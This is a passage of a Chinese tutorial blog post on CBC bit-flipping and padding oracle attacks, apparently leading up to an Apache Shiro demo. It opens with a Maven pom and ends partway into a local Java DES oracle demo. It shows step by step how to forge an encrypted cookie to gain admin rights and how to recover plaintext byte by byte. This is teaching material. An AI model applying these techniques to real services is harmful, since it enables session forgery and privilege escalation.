</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>javax.servlet<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>javax.servlet-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>3.1.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;scope&gt;</span>provided<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>javax.servlet.jsp<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>jsp-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>2.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;scope&gt;</span>provided<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>3.25.0-GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>commons-logging<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>commons-logging<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.slf4j<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>slf4j-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.7.30<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.slf4j<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>slf4j-simple<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.7.30<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;groupId&gt;</span>commons-codec<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>commons-codec<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>1.11<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/dependencies&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;build&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;finalName&gt;</span>shirodemo<span class="nt">&lt;/finalName&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;pluginManagement&gt;</span><span class="c">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;plugins&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-clean-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.1.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-resources-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.0.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-compiler-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.8.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-surefire-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.22.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-war-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.2.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-install-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.5.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-deploy-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.8.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/plugins&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/pluginManagement&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;plugins&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;artifactId&gt;</span>maven-compiler-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;configuration&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;source&gt;</span>8<span class="nt">&lt;/source&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;target&gt;</span>8<span class="nt">&lt;/target&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/configuration&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/plugins&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/build&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/project&gt;</span>
</span></span></code></pre></div><h3 id="cbc加密模式分析">CBC加密模式分析</h3>
<p>相信大家看了网上琳琅满目的文章都头晕眼花了吧，我一开始也是，关于这个漏洞要么就是那几个图用来用去，要么就是直接上工具怎么利用漏洞。这里我先给大家先从小的开始讲，理解一个块加密后再去理解多个块加密，这样一来就很好理解整个加密是怎么运转的了。</p>
<h4 id="一组加密">一组加密</h4>
<p>我们知道AES和DES都是对称加密，会把明文分成几个组，然后对这几个组进行加密。但是我们要理解先从一组的加解密开始，这样就会说上来就地狱级难度了。</p>
<p>那么加密需要有哪些因素来参与呢？</p>
<p>1、明文</p>
<p>2、IV（初始向量）</p>
<p>3、密钥</p>
<p>我们直接上例子，比如加密明文&quot;test&quot;，明文会先跟iv进行异或（XOR），然后再使用密钥进行DES的加密得到密文：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231212122159758.png" alt="image-20231212122159758"></p>
<p>我们可以看到DES加密是8字节一组，那么test后面4个空位是需要填充，这正是CBC模式加密的要求。</p>
<p>看下填充的规则：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231212023550683.png" alt="image-20231212023550683"></p>
<p>因为是从一组开始讲所以，0x08是放到第二组了的。</p>
<p>这里最重要还是要理解XOR（异或）这个原理：</p>
<p><strong>XOR</strong> 全称为<code>exclusive OR</code>,简写为XOR，中文称为<strong>异或运算</strong>。</p>
<p>异或运算是一种数学运算符，主要应用于逻辑运算和计算机体系中的位运算。异或运算的数学符号常表示为“⊕”，运算法则为：</p>
<p><code>A ⊕ B = (¬A ∧B) ∨ (A ∧¬B)</code></p>
<p>简单研究下1个位（比特）的异或运算。</p>
<p>0 ⊕ 0 = 0；（0与0异或运算的结果为0）</p>
<p>0 ⊕ 1 = 1；（0与1异或运算的结果为1）</p>
<p>1 ⊕ 0 = 1；（1与0异或运算的结果为1）</p>
<p>1 ⊕ 1 = 0；（1与1异或运算的结果为0）</p>
<p>异或运算可以类比于奇偶数的加法运算或者是翻牌处理。在按位运算的过程中，参与运算的数值只有两种可能，那么为0要么为1，在这里0为偶数，1位奇数，可以得出下面的运算特征，我们发现结果和异或运算是一致的。</p>
<p>偶数 + 偶数 = 偶数；（偶数与偶数相加运算的结果为偶数）</p>
<p>偶数 + 奇数 = 奇数；（偶数与奇数相加运算的结果为奇数）</p>
<p>奇数 + 偶数 = 奇数；（奇数与偶数相加运算的结果为奇数）</p>
<p>奇数 + 奇数 = 偶数；（奇数与奇数相加运算的结果为偶数）</p>
<p>那解密过程又是如何的呢？那就是反过来就行了：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231212122608286.png" alt="image-20231212122608286"></p>
<p>看起来貌似好像也不难对吧，然后我们下来就开始来理解什么是<code>CBC字节翻转攻击</code>和<code>Padding Oracle Attack</code>。</p>
<p>在这之前我们可以认识一下两个攻击的用途：</p>
<p>1、CBC字节翻转攻击是用来修改明文的</p>
<p>2、Padding Oracle Attack是用来猜解明文的</p>
<p><strong>CBC字节翻转攻击</strong></p>
<p>所谓的字节翻转也就是在XOR的过程发生的，比如原本的明文为：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">test:0
</span></span></code></pre></div><p>那么通过翻转攻击后就能变成：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">test:1
</span></span></code></pre></div><p>可以想象一下后面的1和0在很多鉴权的程序当中就是判断管理员权限的一种写法。</p>
<p>那我们怎么实现呢？</p>
<p>假如我们现在是登陆一个普通用户，拿到cookie，但cookie是通过DES加密的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Cookie: user=31032333435363738FABFFB1F91CBC60B 
</span></span></code></pre></div><p>看到这串东西不要怕，我们慢慢来分析，首先我们先把前十六位拿到出来，因为这个是IV，后面十六位才是密文：</p>
<p>密文：0xFA 0xBF 0xFB 0x1F 0x91 0xCB 0xC6 0x0B</p>
<p>IV：0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38</p>
<p>如果我们需要解密的流程如下：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231212124539411.png" alt="image-20231212124539411"></p>
<p>密钥我们是不知道的，但是服务器会帮我把密文进行解密，那么我们能控制的只有IV值。</p>
<p>从上面的XOR原理我们可以知道：</p>
<blockquote>
<p>这里密文（未通过key加密）就表示中间值</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">明文 XOR IV = 中间值
</span></span></code></pre></div><p>那么如果我们只知道密文和IV：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">中间值 XOR IV = 明文
</span></span></code></pre></div><p>而且还有一条规则是：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">中间值 XOR 0 = 中间值
</span></span></code></pre></div><p>是不是在密文不改变的情况下，我们只要去修改IV就能改变明文的值了！</p>
<p>有同学会问，改变iv那整个解密不是不完整了吗？回到上面的图，可以看到密文先是通过服务器的DES解密（密钥在服务器），然后再和我们的IV进行异或，所以IV的更改不会影响解密过程。</p>
<p>需要修改0的值是在第六位，那么我们就要和第六位的iv进行xor，首先我们要求出中间值的第六位十六进制是多少，我们先把第六位的iv值改为0x00：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x31 0x32 0x33 0x34 0x35 0x00 0x37 0x38
</span></span></code></pre></div><p>然后进行解密，会得出中间值的第六位十六进制：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">中间值第六位 XOR 0 = 06
</span></span></code></pre></div><p>那么再根据我们要修改的0为1，1的ASCII十六进制是0x31，然后我们计算：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">中间值第六位(06) XOR 明文第六位(0x31) = iv第六位(0x37)
</span></span></code></pre></div><p>然后重新组成新的iv值为：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x31 0x32 0x33 0x34 0x35 0x37 0x37 0x38
</span></span></code></pre></div><p>代入进行解密就可得到我们想要的值了：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231212232950664.png" alt="image-20231212232950664"></p>
<p><strong>Padding Oracle Attack</strong></p>
<p>Oracle不是甲骨文公司，而是提示的意思。我们知道上面如果一组明文字符没有用满8字节的话，那么就会用对应的字节进行填充，那么这个填充就是padding。</p>
<p>在分组密码中，有两种常见的填充算法，分别是Pkcs5Padding和Pkcs7Padding。PKCS5Padding与PKCS7Padding基本上是可以通用的。在PKCS5Padding中，明确定义Block的大小是8位，而在PKCS7Padding定义中，对于块的大小是不确定的，填充值的算法都是一样的。</p>
<p>从上面的cbc翻转攻击我们知道怎么去修改解密出来的明文，但是我们是需要知道明文的长度的，如果在我们不知道明文是test:0的时候我们就没办法判断是怎么去修改的了。那么Padding Oracle Attack就能帮助我们判断填充值是多少，而且还可以利用Padding的报错回显的方式进行猜解中间值，拿到中间值然后我们通过下面的式子拿到明文：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">中间值 XOR IV =明文
</span></span></code></pre></div><p>那是怎么一个原理呢？是利用了下面的xor去判断：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">中间值 XOR 0 = 中间值
</span></span></code></pre></div><p>我们举个例子，这个中间值我们是不知道，但我们可以用这个来还原其中的原理，一个中间值为：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">中间值：0x45 0x57 0x40 0x40 0x31 0x32 0x33 0x3C
</span></span></code></pre></div><p>如果我们用全0跟它异或肯定会报错的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">IV：0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
</span></span></code></pre></div><p>由我们上面的填充图可知，明文xor后只有0x01-0x08所以xor后得到0x00是不对的，我们可以一个一个尝试，比如从0x01开始：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">IV：0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01
</span></span></code></pre></div><p>但是还是会报错，为什么呢，因为中间值的最后一位0x3C和IV的最后一位0x01通过xor没有等于0x01，所以会给出报错的信息，我们就需要一个一个去尝试，从0-255,也就是256次内会有一个正确的值，有点类似SQL注入的盲注，可以套用下面的公式</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">中间值(0x3C) XOR IV(？) = 0x01，中间值(0x3C) XOR 0x01 = 0x3D
</span></span></code></pre></div><p>因为我们不知道中间值是多少，只有服务器知道，所以只能采用盲注的方式进行猜解，我们传入的IV值是正确的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">IV：0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x3D
</span></span></code></pre></div><p>以此类推，整个过程最多需要尝试256*8次也就是2048次，便可爆破出中间值。</p>
<p>爆出中间值，我们还可以利用该中间值去修改明文，也就是</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">中间值 XOR IV(？) = 修改后的明文
</span></span></code></pre></div><p>那么我们只要拿修改后的明文跟中间值进行XOR即可得出攻击的iv：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">中间值 XOR 修改后的明文 = 攻击iv
</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231214021449330.png" alt="image-20231214021449330"></p>
<p>下面是小茶包师傅的代码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.crypto.SecretKey</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.crypto.SecretKeyFactory</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.crypto.spec.DESKeySpec</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.crypto.spec.IvParameterSpec</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DES_Test</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="n">flag</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 加密方法，plaintext代表明文，key代表密钥，iv代表初始向量
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">encrypt</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">plaintext</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">iv</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">ciphertext</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">SecretKeyFactory</span> <span class="n">keyFactory</span> <span class="o">=</span> <span class="n">SecretKeyFactory</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DES&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//创建密钥对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">DESKeySpec</span> <span class="n">keySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DESKeySpec</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">SecretKey</span> <span class="n">secretKey</span> <span class="o">=</span> <span class="n">keyFactory</span><span class="o">.</span><span class="na">generateSecret</span><span class="o">(</span><span class="n">keySpec</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//创建iv对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">IvParameterSpec</span> <span class="n">ivParameterSpec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">IvParameterSpec</span><span class="o">(</span><span class="n">iv</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//指定使用DES加密算法，CBC模式，PKCS5Padding填充方式
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DES/CBC/PKCS5Padding&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//初始化cipher对象，Cipher.ENCRYPT_MODE代表这个cipher是用来加密的
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">Cipher</span><span class="o">.</span><span class="na">ENCRYPT_MODE</span><span class="o">,</span> <span class="n">secretKey</span><span class="o">,</span> <span class="n">ivParameterSpec</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//加密
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">plaintext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ciphertext</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//解密方法，ciphertext代表密文，key代表密钥，iv代表初始向量
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">decrypt</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">ciphertext</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">iv</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">plaintext</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">SecretKeyFactory</span> <span class="n">keyFactory</span> <span class="o">=</span> <span class="n">SecretKeyFactory</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DES&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//创建密钥对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">DESKeySpec</span> <span class="n">keySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DESKeySpec</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">SecretKey</span> <span class="n">secretKey</span> <span class="o">=</span> <span class="n">keyFactory</span><span class="o">.</span><span class="na">generateSecret</span><span class="o">(</span><span class="n">keySpec</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//创建iv对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">IvParameterSpec</span> <span class="n">ivParameterSpec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">IvParameterSpec</span><span class="o">(</span><span class="n">iv</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//指定使用DES加密算法，CBC模式，PKCS5Padding填充方式
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DES/CBC/PKCS5Padding&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//初始化cipher对象，Cipher.DECRYPT_MODE代表这个cipher是用来解密的
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">Cipher</span><span class="o">.</span><span class="na">DECRYPT_MODE</span><span class="o">,</span> <span class="n">secretKey</span><span class="o">,</span> <span class="n">ivParameterSpec</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//解密
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">plaintext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">ciphertext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//若程序能运行到这里，说明没有抛异常，也就是Padding部分满足N个0x0N规则，flag值将被置为1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">flag</span> <span class="o">=</span> <span class="n">1</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl"><span class="c1">//            e.printStackTrace();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">plaintext</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//ciphertext代表密文，key代表密钥（服务器），iv代表初始向量（恶意构造的iv）
